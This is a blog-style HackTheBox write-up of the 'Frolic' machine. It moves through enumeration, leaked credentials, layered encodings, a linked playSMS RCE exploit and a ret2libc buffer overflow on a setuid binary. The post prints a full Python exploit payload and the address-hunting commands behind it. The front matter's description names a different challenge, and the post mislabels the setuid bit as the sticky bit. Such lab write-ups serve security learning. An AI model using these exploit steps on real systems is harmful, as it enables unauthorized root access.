---
layout: post
title: "Frolic — HacktheBox Walkthrough"
date:   2019-03-23
categories: challenge
tags: CTF |  FLAG  |  CHALLENGE
description: Hey guys! This post I’ll be showing you how I solved the Hello World Challenge from TAMUCTF2019.
---

<small> <i> Tags: CTF | RATF | FLAG | CHALLENGE </i> </small>

![image example](/img/jekyll/6/desc.png){:class="img-responsive"}
{:class="text-center"}

Hey guys! In this post I will be showing how I solved the machine “Frolic” from HackTheBox.

It was a pretty ctf like machine, and well… I love ctfs, so that turned out to be really fun, specially priv esc part.

I’ll be posting the links where I got some references on how to proceed when I got a bit stucked.

![image example](/img/jekyll/1/ratf.png){:class="img-responsive"}
{:class="text-center"}

Let’s start with our standard nmap scan:

{% highlight cmd %}
nmap -sV -sC -v 10.10.10.111
# Nmap 7.60 scan initiated Sat Mar 16 08:43:07 2019 as: nmap -sV -sC -v -o frolic 10.10.10.111
Nmap scan report for 10.10.10.111
Host is up (0.23s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (EdDSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel
Host script results:
| nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   FROLIC<00>           Flags: <unique><active>
|   FROLIC<03>           Flags: <unique><active>
|   FROLIC<20>           Flags: <unique><active>
|   WORKGROUP<00>        Flags: <group><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2019-03-16T17:13:43+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2019-03-16 08:43:43
|_  start_date: 1600-12-31 21:26:00
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 16 08:43:49 2019 -- 1 IP address (1 host up) scanned in 42.33 seconds
{% endhighlight %}

We can spot four different services running on this box, three of them are useless for us, so let’s focus on the service running on port 9999, a web service.

![image example](/img/jekyll/6/example1.png){:class="img-responsive"}
{:class="text-center"}

We are presented with the default nginx page, brute forcing some directories we find the /admin page.

![image example](/img/jekyll/6/example2.png){:class="img-responsive"}
{:class="text-center"}

A log in page, we must find some credentials. Looking in the source code of the js file, we find this.

![image example](/img/jekyll/6/code1.png){:class="img-responsive"}
{:class="text-center"}

Great, we got our user and pass. Let’s check the success.html page.

{% highlight cmd %}
user = admin
password = superduperlooperpassword_lol
{% endhighlight %}

![image example](/img/jekyll/6/example3.png){:class="img-responsive"}
{:class="text-center"}

What the heck is this?? 😐

After some searching on esoteric languages I found this “Ook!?” Programming language and a website that could decode it.

![image example](/img/jekyll/6/example4.png){:class="img-responsive"}
{:class="text-center"}

It tells us to check another directory so off we go.

Reaching this dir we find this

{% highlight cmd %}
UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwAB BAAAAAAEAAAAAF5E5hBKn3OyaIopmhuVUPBuC6m/U3PkAkp3GhHcjuWgNOL22Y9r7nrQEopVyJbs K1i6f+BQyOES4baHpOrQu+J4XxPATolb/Y2EU6rqOPKD8uIPkUoyU8cqgwNE0I19kzhkVA5RAmve EMrX4+T7al+fi/kY6ZTAJ3h/Y5DCFt2PdL6yNzVRrAuaigMOlRBrAyw0tdliKb40RrXpBgn/uoTj lurp78cmcTJviFfUnOM5UEsHCCP+WxSwAAAAaQIAAFBLAQIeAxQACQAIAMOJN00j/lsUsAAAAGkC AAAJABgAAAAAAAEAAACkgQAAAABpbmRleC5waHBVVAUAA4V8p1t1eAsAAQQAAAAABAAAAABQSwUG AAAAAAEAAQBPAAAAAwEAAAAA
{% endhighlight %}


It appears to be a base64 encoded message, so when I decoded it show a PK… among other random bytes.So this is a zip file.

When I tried the unzip It asks for a password. I just brute forced it and the password found as was “password”, how cool xd.

Moving on, the file inside called “index.php” shows:

{% highlight cmd %}
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
{% endhighlight %}

obviously some hex code

decoding it we get another b64 and after that we find this

{% highlight cmd %}
+++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>++..<
{% endhighlight %}

That’s clearly a brain f*ck code. Let’s see what is says


![image example](/img/jekyll/6/example5.png){:class="img-responsive"}
{:class="text-center"}

Cool, we got something that looks like a password, but password for what? 😿

Let’s go back to our enumeration phase and start over, we must have missed something.

![image example](/img/jekyll/6/example6.png){:class="img-responsive"}
{:class="text-center"}

{% highlight cmd %}
The backup gives us some creds, but it is a rabbit hole :(
the test page gives us php info. nothing useful.
dev page a 403 error.
{% endhighlight %}

Awesome, after some more enumeration we got nothing xd

Let’s keep trying

Looking into dev/ folder we have another backup.

![image example](/img/jekyll/6/code2.png){:class="img-responsive"}
{:class="text-center"}

And there we have a /playsms folder, finally something to use ours creds on.

![image example](/img/jekyll/6/example7.png){:class="img-responsive"}
{:class="text-center"}

To get our reverse shell I found this great exploit on github.

![image example](/img/jekyll/6/example8.png){:class="img-responsive"}
{:class="text-center"}

[CLICK TO ACCESS GITHUB- jasperla][linkjasperla]{:class="btn btn-blue"}
{:class="text-center"}

[linkjasperla]:https://github.com/jasperla/CVE-2017-9101

![image example](/img/jekyll/6/code3.png){:class="img-responsive"}
{:class="text-center"}

Sweet! We got rce.

Since this is a pretty bad shell I got a new one using php and netcat. But I’ll just skip this part xd

After getting a better shell, just went to the user home dir and found user.txt xd.

![image example](/img/jekyll/6/code4.png){:class="img-responsive"}
{:class="text-center"}

Now the root part!

Searching the home directory of ayush, we find a .binary dir.

![image example](/img/jekyll/6/code5.png){:class="img-responsive"}
{:class="text-center"}

We find a “rop” binary. Notice its permissions, any user can execute it and do it as root because the sticky bit is set.So if we invoke a shell using this binary we get root, let’s try.

<i>In this post I’ll not be explaining how a buffer overflow occurs or how to exploit it in details. I’m just gonna explain some thoughts that I had during the exploitation.</i>

The binary simply runs with an argument the we pass and spits it back out for us, nothing interesting, however if we send a lot of bytes to it, it breaks.

![image example](/img/jekyll/6/code6.png){:class="img-responsive"}
{:class="text-center"}

Cool, we can overwrite EIP but return where?

The name of the binary already gives us a pretty good hint on what to do, let’s use a technique called “Return to libc” that is a type of ROP.

<i>You can learn more what is ROP here</i>

If you wanna know more about Ret2libc those following links helped me a lot.

<p class="text-center">
<iframe width="560" height="315" src="https://www.youtube.com/embed/m17mV24TgwY" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
</p>


![image example](/img/jekyll/6/example9.png){:class="img-responsive"}
{:class="text-center"}


[CLICK TO ACCESS RET2LIBC][linkret2libc]{:class="btn btn-blue"}
{:class="text-center"}

[linkret2libc]:https://galvanizedsecurity.com/ret2libc/

So basically we need 5 things to succeed.
<ol>
	<li>The offset to overwrite EIP</li>
	<li>libc base address</li>
	<li>system call offset</li>
	<li>exit call offset (optional)</li>
	<li>string “/bin/bash”</li>
</ol>
Lets do one by one:

To get the offset to overwrite eip I used that pretty standard technique with pattern_create, and got a number of 52.

To get libc base address we use ldd and grep for libc.

![image example](/img/jekyll/6/code7.png){:class="img-responsive"}
{:class="text-center"}

<i>Note: ASLR is turned off in this box, so lucky for us we don’t need to bypass it.</i>

Now we need system call offset for libc we do

{% highlight cmd %}
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
{% endhighlight %}

![image example](/img/jekyll/6/code8.png){:class="img-responsive"}
{:class="text-center"}

Same thing for exit function.

{% highlight cmd %}
readelf -s /lib/i386-linux-gnu/libc.so.6 | grep exit
{% endhighlight %}

![image example](/img/jekyll/6/code9.png){:class="img-responsive"}
{:class="text-center"}

Now the last thing we need is to find “/bin/sh” string, we do.

{% highlight cmd %}
strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
{% endhighlight %}

![image example](/img/jekyll/6/code10.png){:class="img-responsive"}
{:class="text-center"}

Sweet, we got everything we need. Let’s chain all together with some python code.

{% highlight c %}
import struct

offset = "A"*52

libc_base_addr = 0xb7e19000
system_base_addr = 0x0003ada0
exit_base_addr = 0x0002e9d0
base_sh = 0x0015ba0b

system_addr = struct.pack("<I", libc_base_addr + system_base_addr)
exit_addr = struct.pack ("<I", libc_base_addr + exit_base_addr)
bin_sh = struct.pack("<I", libc_base_addr + base_sh)

print offset + system_addr + exit_addr + bin_sh
{% endhighlight %}

So running this:

![image example](/img/jekyll/6/code11.png){:class="img-responsive"}
{:class="text-center"}

we get our root shell!

![image example](/img/jekyll/6/code12.png){:class="img-responsive"}
{:class="text-center"}

Hope you guys enjoyed it!

by me